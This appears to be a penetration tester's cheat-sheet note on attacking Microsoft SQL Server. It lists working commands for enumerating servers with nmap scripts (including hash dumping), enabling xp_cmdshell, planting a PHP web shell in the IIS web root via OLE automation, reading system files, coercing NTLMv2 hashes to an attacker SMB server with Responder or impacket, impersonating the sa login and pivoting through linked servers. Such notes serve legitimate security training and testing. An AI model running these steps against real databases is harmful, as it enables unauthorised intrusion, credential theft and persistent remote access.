Nmap:
```bash
sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>
```

```SQL
SELECT name FROM sys.databases
GO
```


# Dangerous Settings
- MSSQL clients not using encryption to connect to the MSSQL server.
- The use of self-signed certificates when encryption is being used. Possible to spoof self-signed certificates.
- The use of [named pipes](https://docs.microsoft.com/en-us/sql/tools/configuration-manager/named-pipes-properties?view=sql-server-ver15).
- Weak & default `sa` credentials. Admins may forget to disable this account.
## XP_CMDSHELL
If we have appropriate privileges, we can enable `xp_cmdshell`:
```mysql
-- To allow advanced options to be changed.  
> EXECUTE sp_configure 'show advanced options', 1
> RECONFIGURE
> EXECUTE sp_configure 'xp_cmdshell', 1
> RECONFIGURE
```
There are other methods to get command execution, such as adding [extended stored procedures](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/adding-an-extended-stored-procedure-to-sql-server), [CLR Assemblies](https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration), [SQL Server Agent Jobs](https://docs.microsoft.com/en-us/sql/ssms/agent/schedule-a-job?view=sql-server-ver15), and [external scripts](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-execute-external-script-transact-sql). Or additional functionalities like the `xp_regwrite` command, used to elevate privileges by creating new entries in the Windows registry.
# Write Local Files
>Required Admin privileges to enable [Ole Automation Procedures](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option)
## 1. Enable Ole Automation Procedures
```mysql
> sp_configure 'show advanced options', 1
> RECONFIGURE
> sp_configure 'Ole Automation Procedures', 1
> RECONFIGURE
```
## 2. Create File
```mysql
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```
# Read File
>Same read permission as the system account.
```sql
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
```
# Capture Service Hash
The undocumented stored procedures `xp_subdirs` and `xp_dirtree` uses SMB protocol to retrieve a list of child directories. We can use a stored procedure and point it to our SMB server, the directory listening functionality will force the server to authenticate and send the NTLMv2 hash of the service account that is running the SQL Server.

```mysql
1> EXEC master..<xp_dirtree/xp_subdirs> '\\<OUR-IP>\share\'
```
If the service account has access to our server, we will obtain its hash. We can then attempt to crack the hash or relay it to another host.
>Relay might not work on same host as Windows patched it for originating system.
## SMB Servers
### [[Responder]]
```shell-session
$ sudo responder -I tun0
... SNIP ...
[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.10.110.17
[SMB] NTLMv2-SSP Username : SRVMSSQL\demouser
[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:5e3ab...SNIP...
```
### [[SMBServer]]
```shell-session
$ impacket-smbserver share ./ -smb2support
... SNIP ...
[*] Incoming connection (10.129.203.7,49728)
[*] AUTHENTICATE_MESSAGE (WINSRV02\mssqlsvc,WINSRV02)
[*] User WINSRV02\mssqlsvc authenticated successfully                        
[*] demouser::WIN7BOX:5e3ab...SNIP...
```
# Impersonate Users
>Sysadmins can impersonate anyone by default, But for non-administrator users, privileges must be explicitly assigned.
## Identify Users to Impersonate
```mysql
> SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
```

```mysql
> SELECT DISTINCT name FROM sys.sysusers;
```
>**Note:** If a user isn't sysadmin, they still might be able to access other databases or linked servers
## Verify Current User/Role
```mysql
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go
```
If we see `0` we do not have sysadmin role, but can still impersonate `sa` user.
## Impersonate User
```mysql
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO
```
We should see `1` for a successful transaction
>**Note:** It's recommended to run `EXECUTE AS LOGIN` within the master DB, because all users, by default, have access to that database. If the impersonated user doesn't have access to the DB you are connecting to, it will present an error. Do `USE master`.

# Linked Servers
If an SQL server has linked server configured, we could move laterally to that database server. If it is configured using credentials from remote server, and those credentials have sysadmin privileges, we could execute commands on that remote SQL instance.
## Identify Linked Servers
```mysql
> SELECT srvname, isremote FROM sysservers
```
`1` means a remote server, `0` means a linked server.
## Identify User
Identify the user used for the connection and its privileges. The [EXECUTE](https://docs.microsoft.com/en-us/sql/t-sql/language-elements/execute-transact-sql) statement sends pass-through commands to linked servers.
## Send Commands to Linked Server
Once we switched our user using `EXECUTE AS LOGIN = 'user'`, we can send commands to the linked server.
```mysql
> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [<IP>\<LINKED-SERVER>]

------------------------------ ------------------------------ 
DESKTOP-0L9D4KA\SQLEXPRESS     Microsoft SQL Server 2019 (RTM sa_remote
```
>**Note:** If we need to use quotes in our query to the linked server, use single double quotes to escape the single quote. To run multiples commands at once, divide them up with a semi colon (;)

## Useful
```mysql
> EXEC sp_linkedservers;
> EXEC sp_helplinkedsrvlogin 'LOCAL.TEST.LINKED.SRV';
> SELECT * FROM [LOCAL.TEST.LINKED.SRV].master.sys.databases;
```
# Clients
Clients to access MSSQL:
### Linux
- [[MSSQLclient|Impacket-MSSQLClient]]
- [[sqsh]]
- [[dbeaver]]
- [mssql-cli](https://docs.microsoft.com/en-us/sql/tools/mssql-cli?view=sql-server-ver15)
### Windows
- [mssql-cli](https://docs.microsoft.com/en-us/sql/tools/mssql-cli?view=sql-server-ver15)
- [SQL Server PowerShell](https://docs.microsoft.com/en-us/sql/powershell/sql-server-powershell?view=sql-server-ver15)
- [HeidiSQL](https://www.heidisql.com/)
- [SQLPro](https://www.macsqlclient.com/)
- [[sqlcmd]]



